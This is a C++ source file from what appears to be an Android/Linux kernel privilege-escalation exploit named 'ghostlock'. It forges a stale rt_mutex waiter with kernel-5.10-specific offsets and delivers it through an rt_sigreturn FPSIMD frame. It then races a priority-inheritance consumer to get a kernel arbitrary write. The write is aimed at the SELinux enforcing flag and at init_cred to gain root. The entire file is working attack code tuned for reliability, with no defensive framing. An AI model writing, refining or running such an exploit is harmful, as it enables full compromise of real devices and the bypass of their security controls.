#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "memory/payload_builder.h"
#include "route/route_status.h"
#include "route/sigreturn_stamp.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"

using namespace ghostlock;

namespace ghostlock::route {
    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            status.step = 58;
            status.error_number = EINVAL;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return status;
        }
        const size_t stamp_size = *layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (!memory::encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
            *layout.lock_offset,
            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
                       static_cast<size_t>(*layout.task_offset),
                       static_cast<size_t>(*layout.lock_offset), stamp_size);
            return status;
        }
        /* E3 (hypothesis B fix): populate tree_entry and pi_tree_entry in the
         * stale waiter so rb_erase deterministically writes *(target)=0 during
         * the EDEADLK cleanup path.  pi_tree_entry is at +0x18 on 5.10 (no
         * wake_state/ww_ctx), +0x28 on 6.x.  Use 0x18 for this 5.10 kernel. */
        if (request && request->target) {
            constexpr size_t kPiTreeOff_5_10 = 0x18;
            if (!memory::encode_multicast_waiter_trees(
                    {reinterpret_cast<std::byte *>(stamp), stamp_size},
                    static_cast<size_t>(*layout.waiter_offset),
                    kPiTreeOff_5_10, request->target)) {
                pr_warning("E3: tree field injection failed\n");
            } else {
                pr_info("E3: tree fields planted for target=0x%llx\n",
                        (unsigned long long)request->target);
            }
        }
        /* E6a (prio gate): flat 5.10 rt_mutex_waiter carries prio alone at
         * +0x40 (no wake_state word).  E3 filled the tree fields and task/lock
         * but left prio=0, so the waiter-vs-task prio comparisons and the
         * erase gate never passed: every E3/E4/E5 run returned route-clean
         * with no write.  Upstream PR #721 stamps this same word for its
         * select_stack route (waiter_prio_off = 0x40). */
        if (request && request->target) {
            const size_t prio_off = static_cast<size_t>(*layout.waiter_offset) + 0x40;
            const uint32_t prio = static_cast<uint32_t>(kernel::FAKE_WAITER_PRIO);
            if (prio_off + sizeof(prio) <= stamp_size) {
                memcpy(stamp + prio_off, &prio, sizeof(prio));
                pr_info("E6a: stale waiter prio=%u planted at stamp+0x%zx\n",
                        prio, prio_off);
            } else {
                pr_warning("E6a: prio word outside stamp (off=0x%zx size=%zu)\n",
                           prio_off, stamp_size);
            }
        }
        /* Stamp delivery (katyusha / 5.10 MP6): the IPv4 msfilter copy window
         * on this kernel cannot reach the waiter (kernel copies max 0x108 at
         * stack depth 864; waiter task/lock need 480 bytes from the window
         * start). Deliver the same encoded stamp through rt_sigreturn's
         * fpsimd restore instead: its 528-byte kernel stack buffer sits at
         * depth 768 and covers waiter_off=320 (task/lock at stamp offsets
         * 368/376 = vregs[23]). The stamp syscall is a one-shot like
     * setsockopt; surviving the restore means the copy landed (any frame
     * fault kills this thread with SIGSEGV instead of returning). */
        alignas(16) uint8_t frame[kSigStampFrameBytes];
        build_sigreturn_stamp_frame(
                frame, stamp, stamp_size,
                current_blocked_sigmask());

        session::g_exploit_session.race.consumer_calls.store(0);
        session::g_exploit_session.race.consumer_success.store(0);
        session::g_exploit_session.race.consumer_stop.store(0);
        session::g_exploit_session.race.route_delay_usec.store(0);
        errno = 0;
        ghostlock_fire_sigreturn_stamp(frame);
        int32_t stamp_result = 0;
        status.step = 61;
        status.error_number = 0;
        session::g_exploit_session.race.consumer_go.store(1);
        for (int32_t spin = 0; spin < 100000000 &&
                           session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
            __asm__ volatile (


        "yield"
        ::: "memory");
        /* E1/E2 (hypothesis A): keep the window armed until the consumer has
         * spent its full call budget. Closing right after the first call made
         * select_consumer_max_calls a no-op on this route and left the PI walk
         * a single racing attempt. The extended budget applies only to the W1
         * request (its consumer stops itself the moment the enforce flag
         * flips); every other window keeps the proven one-call behaviour. */
        const bool e1_selinux_write =
                session::g_exploit_session.race.request &&
                session::g_exploit_session.race.request->target ==
                    session::g_exploit_session.addresses.data_alias(
                        ghostlock::profile::selinux_enforcing());
        const uint32_t e1_budget = e1_selinux_write
                ? session::g_exploit_session.profile.select_consumer_max_calls()
                : 1;
        for (int32_t spin = 0; spin < 100000000 &&
                           (session::g_exploit_session.race.consumer_go.load() != 0 &&
                            session::g_exploit_session.race.consumer_calls.load() < e1_budget);
             spin++)
            __asm__ volatile (


        "yield"
        ::: "memory");
        session::g_exploit_session.race.consumer_go.store(0);
        while (session::g_exploit_session.race.consumer_inflight.load())
            __asm__ volatile (


        "yield"
        ::: "memory");
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (stamp_result == 0 ||
            session::g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number);
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/route_policy.hpp"

namespace ghostlock::route {
    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
     * defined here because the implementations are Android-only. The one-shot
     * route keeps its own small stack frame in
     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
    bool MulticastPolicy::w2_fast_repair_prebuild(
        session::ExploitSession &exploit_session) noexcept {
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        (exploit_session.heap.current.base) =
                support::prepare_good_kernel_page(repair_request);
        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
            pr_warning("W2 fast repair prebuild failed\n");
            support::discard_prebuilt_page();
            return false;
        }
        pr_info("W2 fast repair payload prebuilt\n");
        return true;
    }

    bool MulticastPolicy::w2_fast_repair_activate(
        session::ExploitSession &exploit_session) noexcept {
        if (!support::activate_prebuilt_page()) {
            pr_warning("W2 fast repair activation failed\n");
            return false;
        }
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        exploit_session.race.fast_repair.store(1);
        const Status repaired = race::run_main_route_threads(repair_request);
        exploit_session.race.fast_repair.store(0);
        if (!repaired) {
            pr_warning("W2 fast repair route failed\n");
            return false;
        }
        return true;
    }
} // namespace ghostlock::route
#endif
